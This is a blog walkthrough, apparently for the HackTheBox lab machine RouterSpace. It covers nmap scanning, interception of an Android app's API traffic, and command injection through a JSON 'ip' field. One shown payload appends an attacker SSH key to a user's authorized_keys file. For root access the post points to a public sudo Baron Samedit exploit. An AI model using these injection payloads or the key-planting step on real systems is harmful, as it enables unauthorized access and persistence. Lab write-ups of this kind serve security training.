@@ -1,0 +1,154 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="ROUTERSPACE (Linux) Walkthrough  Reconnaissance Let&amp;rsquo;s do a Quick Scan of the target using NMAP.
+nmap -sV -sC -O -oA nmap/initial 10.10.11.148 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &amp;hellip;
+ PORT 22 : running SSH (protocol 2.0) PORT 80 : running HTTP.  └─# nmap -sV -sC -O -oA nmap/initial 10."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-router/><title>HackTheBox: Routerspace :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Routerspace"><meta itemprop=description content="ROUTERSPACE (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
+nmap -sV -sC -O -oA nmap/initial 10.10.11.148 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
+ PORT 22 : running SSH (protocol 2.0) PORT 80 : running HTTP.  └─# nmap -sV -sC -O -oA nmap/initial 10."><meta itemprop=datePublished content="2022-06-13T00:00:00+00:00"><meta itemprop=dateModified content="2022-06-13T00:00:00+00:00"><meta itemprop=wordCount content="1218"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Routerspace"><meta name=twitter:description content="ROUTERSPACE (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
+nmap -sV -sC -O -oA nmap/initial 10.10.11.148 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
+ PORT 22 : running SSH (protocol 2.0) PORT 80 : running HTTP.  └─# nmap -sV -sC -O -oA nmap/initial 10."><meta property="og:title" content="HackTheBox: Routerspace"><meta property="og:description" content="ROUTERSPACE (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
+nmap -sV -sC -O -oA nmap/initial 10.10.11.148 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
+ PORT 22 : running SSH (protocol 2.0) PORT 80 : running HTTP.  └─# nmap -sV -sC -O -oA nmap/initial 10."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-router/"><meta property="article:published_time" content="2022-06-13T00:00:00+00:00"><meta property="article:modified_time" content="2022-06-13T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-06-13 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>S3cur!ty_Bl0g</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-router/>HackTheBox: Routerspace</a></h2><div class=post-content><h1 id=routerspace-linux-walkthrough>ROUTERSPACE (Linux) Walkthrough</h1><p><img src=/assets/Pasted%20image%2020220307073855.png alt="assets/Pasted image 20220307073855.png"></p><hr><h1 id=reconnaissance>Reconnaissance</h1><p>Let&rsquo;s do a Quick Scan of the target using NMAP.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sV -sC -O -oA nmap/initial 10.10.11.148
+</code></pre></div><ul><li><strong>-sC</strong> : run Default Nmap scripts</li><li><strong>-sV</strong> : detects service versions</li><li><strong>-O</strong> : detects OS</li><li><strong>-oA</strong> : output all formats and store in file *nmap/initial</li></ul><p>We got the following result &mldr;</p><ul><li><strong>PORT 22</strong> : running SSH (protocol 2.0)</li><li><strong>PORT 80</strong> : running HTTP.</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─# nmap -sV -sC -O -oA nmap/initial 10.10.11.148
+Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-07 07:47 EST
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.148
+Host is up <span style=color:#f92672>(</span>0.23s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>998</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-RouterSpace Packet Filtering V1
+| ssh-hostkey: 
+|   <span style=color:#ae81ff>3072</span> f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+|   <span style=color:#ae81ff>256</span> 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+|_  <span style=color:#ae81ff>256</span> 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+80/tcp open  http
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-23863
+|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+|     Content-Length: 69
+|     ETag: W/<span style=color:#e6db74>&#34;45-IcuAdj6TtPzZtR1rICshJ+KU7qo&#34;</span>
+|     Date: Mon, <span style=color:#ae81ff>07</span> Mar <span style=color:#ae81ff>2022</span> 12:54:41 GMT
+|     Connection: close
+|     Suspicious activity detected !!! <span style=color:#f92672>{</span>RequestID: A Yh q Bx rELF <span style=color:#f92672>}</span>
+|   GetRequest: 
+|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-67814
+|     Accept-Ranges: bytes
+|     Cache-Control: public, max-age<span style=color:#f92672>=</span>0
+|     Last-Modified: Mon, <span style=color:#ae81ff>22</span> Nov <span style=color:#ae81ff>2021</span> 11:33:57 GMT
+|     ETag: W/<span style=color:#e6db74>&#34;652c-17d476c9285&#34;</span>
+|     Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
+|     Content-Length: 25900
+|     Date: Mon, <span style=color:#ae81ff>07</span> Mar <span style=color:#ae81ff>2022</span> 12:54:39 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;no-js&#34;</span> lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;zxx&#34;</span>&gt;
+|     &lt;head&gt;
+|     &lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>&gt;
+|     &lt;meta http-equiv<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;x-ua-compatible&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ie=edge&#34;</span>&gt;
+|     &lt;title&gt;RouterSpace&lt;/title&gt;
+|     &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;description&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>&gt;
+|     &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/bootstrap.min.css&#34;</span>&gt;
+|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/owl.carousel.min.css&#34;</span>&gt;
+|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/magnific-popup.css&#34;</span>&gt;
+|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/font-awesome.min.css&#34;</span>&gt;
+|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/themify-icons.css&#34;</span>&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-94317
+|     Allow: GET,HEAD,POST
+|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+|     Content-Length: 13
+|     ETag: W/<span style=color:#e6db74>&#34;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&#34;</span>
+|     Date: Mon, <span style=color:#ae81ff>07</span> Mar <span style=color:#ae81ff>2022</span> 12:54:39 GMT
+|     Connection: close
+|     GET,HEAD,POST
+|   RTSPRequest, X11Probe: 
+|     HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
+|_    Connection: close
+|_http-title: RouterSpace
+|_http-trane-info: Problem with XML parsing of /evox/about
+</code></pre></div><p>Let&rsquo;s do a Full machine scan to make sure we are not skipping any ports or services on uncommon ports.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sC -sV -O -oA nmap/full 10.10.11.148 -p-
+</code></pre></div><p>Similarly Let&rsquo;s run a UDP Scan as well</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sU -O -p- -oA nmap/udp 10.10.11.148
+</code></pre></div><p>There were no other open ports available.</p><hr><h1 id=enumeration>Enumeration</h1><p>Port 22 is running SSH and don&rsquo;t have large attack surface. So its better to start enumeration with HTTP (80) Port.</p><h3 id=port-80-http>PORT 80 (HTTP)</h3><p>Going through the website , we found a Apk to download.
+We can try to enumerate more in following ways.</p><ul><li>Directory Bruteforcing to find out more directories.</li><li>Downloaded APK Analysis.</li></ul><p>I have tried Directory Bruteforcing with Burp Suite / Gobuster but didn&rsquo;t got any relevant results.</p><h4 id=static-apk-analysis>Static APK Analysis</h4><p>So we can now try to analyse the APK file for Possible URL endpoints and sensitive data.
+I used <a href=https://github.com/s0md3v/Diggy>Diggy</a>, <a href=https://github.com/ndelphit/apkurlgrep>ApkUrlGrep</a> and Virustotal to extract the possible URL endpoints , But didn&rsquo;t got any relevant results.</p><h4 id=dynamic-apk-analysis>Dynamic APK Analysis</h4><p>I used an Android Emulator Tool <a href=https://docs.anbox.io/userguide/install_apps.html>Anbox</a> , You can try Genymotion and other alternatives as well.</p><h6 id=setting-up-environment>Setting Up Environment</h6><p><a href=https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd>Blog used</a> to setup environment.</p><p>Follow the Blog carefully to install the Anbox in your Attacker Machine.
+We have to install the APK in the Emulator, To install APK in Emulator.</p><p>Installing adb or Android Tools.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo apt install android-tools-adb
+</code></pre></div><p>Verify if the emulator is connected with ADB or not. ( MAke sure to run the Emulator First, Use Blog)</p><p>Install the Apk That we have downloaded</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>adb install RouterSpace.apk
+</code></pre></div><p>routerspace.htbrouterspace.htbrouterspace.htbAs we have to inspect the traffic that APK file is creating , Let&rsquo;s use Burp to intercept all the traffic and request.</p><p>Adding Burp Proxy in emulator to intercept all traffic.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>adb shell settings put global http_proxy 192.168.250.1:8080
+</code></pre></div><p>Add a new Proxy Listener on specific Address of the Anbox Adaptor.</p><p>Run the Anbox and Launch the RouterSpace Application
+Payload used.
+Turn ON the Proxy > Intercept , To intercept the http request made by RouterSpace Application.</p><p>We intercepted a HTTP request ,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>routerspace.htb
+
+POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+accept: application/json, text/plain, */*
+user-agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 16
+Host: routerspace.htb
+Connection: close
+Accept-Encoding: gzip, deflate
+
+<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ip&#34;</span>:<span style=color:#e6db74>&#34;0.0.0.0&#34;</span><span style=color:#f92672>}</span>
+
+</code></pre></div><p>Add the host in /etc/hosts file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>echo <span style=color:#e6db74>&#34;10.10.11.148 routerspace.htb&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>We can Now use Burp Suite Repeater to verify if we can do command injection through this request.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>routerspace.htb
+
+POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+accept: application/json, text/plain, */*
+user-agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 16
+Host: routerspace.htb
+Connection: close
+Accept-Encoding: gzip, deflate
+
+<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ip&#34;</span>:<span style=color:#e6db74>&#34;0.0.0.0 &amp;&amp; whoami&#34;</span><span style=color:#f92672>}</span>
+
+</code></pre></div><p>We got the following response containing the output of thw <code>whoami</code> command.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+X-Powered-By: RouterSpace
+X-Cdn: RouterSpace-27835
+Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+Content-Length: 17
+ETag: W/<span style=color:#e6db74>&#34;11-tdPSPd19BiT+sR1i0jUMd1omTgQ&#34;</span>
+Date: Sat, <span style=color:#ae81ff>12</span> Mar <span style=color:#ae81ff>2022</span> 04:35:55 GMT
+Connection: close
+
+<span style=color:#e6db74>&#34;0.0.0.0\npaul\n&#34;</span>
+
+</code></pre></div><p>We found out that the server is running commands as <code>paul</code> user.</p><p>We are able to inject command, We can try to get a reverse shell to gain access.</p><hr><h1 id=gaining-a-foothold>Gaining a Foothold</h1><p>We are able to inject the OS command , let&rsquo;s try to get a shell to the target machine.
+We can use few methods to gain access to target machine.</p><ul><li>Using a Reverse Shell</li><li>Using SSH Port</li></ul><p>I tried to run a reverse shell command and got no response and tested every possiblities, Even tried to curl a http server that was running on attacker machine. Tried common ports as well, But seems like there is firewall blocking the outgoing connections.</p><p>So , We have to use ssh port to gain access, But to do so we need the private ssh key.
+We have the command injection capabilities , So we can easily put that SSH Public key in authorised keys in the target machine.</p><p>Let&rsquo;s create a private and Public SSH key in attacker machine and then we can put those key in the target machine.</p><p>Creating a ssh key pair.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>ssh-keygen -f id_rsa
+</code></pre></div><p>This Command will generate two files , Private key and Public key,
+We can add the Public key to authorized keys in the target machine and use the generated private key to get access to the target machine.</p><p>Let&rsquo;s Put the public key in Target machine authorized keys.
+We Can use Below Payload Request to do so.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+accept: application/json, text/plain, */*
+user-agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 55
+Host: routerspace.htb
+Connection: close
+Accept-Encoding: gzip, deflate
+
+<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ip&#34;</span>:<span style=color:#e6db74>&#34;0.0.0.0 &amp;&amp; echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxec4HSG56eubbTGtRQ/xYZq4Y8iXLhJFSsn6Ly8Ob5NxBPAQ6MpRWVSL/EQAfHDMMoU3EqBfuYckr13gp4JYNQGsNW1fmkq9gBVB0D1x5mfN8k8zBpI2u9Nbb4h0P6y7nrl8OGsC4nTzDG3+IV8CPvytfnI+wwWfhrwkH9OHJAvPBmMKnOyY9DkXa+f8hm4y8frKxHj0zb7P3bM8Ty7Z4Aok8a+wtaAfRXdfArHtIdsSawCWSMgQL0xGU6EyimDntFdJDjLhgC+X+ZsBeV5zA/+D5gTAQaLeUH7N1kQ/eQZ7wAO9D1Y7M3uNzGJVCXHWq15zhEcDylxDPv1Xl2JBn6T0yB1yjJrC+YEzIocZi39zQxRQWqkF3gu8WwcHz5eZy/a0T3MnGDwThd28mxEKKZRr5Yw4CRLZduZjer6t4iAL+IYGpeuwVyLYlTyd6LVJDJFtY0QCBuTiKx/0WbbScN3bkYWwNc+QhvNJru+39L7zO21m/7N+uj4WP2PFL2wc= root@kali&#39; &gt;&gt; /home/paul/.ssh/authorized_keys&#34;</span><span style=color:#f92672>}</span>
+</code></pre></div><p>Make sure the private key is correctly added in authorized keys on target machine.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+accept: application/json, text/plain, */*
+user-agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 55
+Host: routerspace.htb
+Connection: close
+Accept-Encoding: gzip, deflate
+
+<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ip&#34;</span>:<span style=color:#e6db74>&#34;0.0.0.0 &amp;&amp; cat /home/paul/.ssh/authorized_keys&#34;</span><span style=color:#f92672>}</span>
+</code></pre></div><p>Let&rsquo;s use the private key to get the access on target machine using ssh.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>ssh paul@10.10.11.148 -i id_rsa
+</code></pre></div><p>We got the User access, Let&rsquo;s try to find the User Flag.</p><p><img src=/assets/Pasted%20image%2020220312001929.png alt="assets/Pasted image 20220312001929.png"></p><p>To gain the Root access we need to escalate privilege.</p><hr><h1 id=privilege-escalation>Privilege Escalation</h1><p>Let&rsquo;s run the Linpeash to find some possible Privilege escalation vectors.</p><p>We got the following Results and found that the machine is possibly vulnerable to CVE-2021-4034 , CVE-2021-3156 and others.</p><p><img src=/assets/Pasted%20image%2020220308085210.png alt="assets/Pasted image 20220308085210.png"></p><p>I tried to used Pwnkit Exploit , But that didn&rsquo;t worked out, But the CVE-2021-3156 Sudo Baron Samedit Exploit worked out.</p><p>Get the Exploit from <a href=https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py>here</a>.
+Run the Exploit and and we should be able to get the root shell.</p><p><img src=/assets/Pasted%20image%2020220308121131.png alt="assets/Pasted image 20220308121131.png"></p><p>We Got the Root Shell and also Got the Root Flag.</p><p><img src=/assets/Pasted%20image%2020220308121300.png alt="assets/Pasted image 20220308121300.png"></p><h6 id=thank-you-for-reading>Thank You For Reading</h6><hr></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>
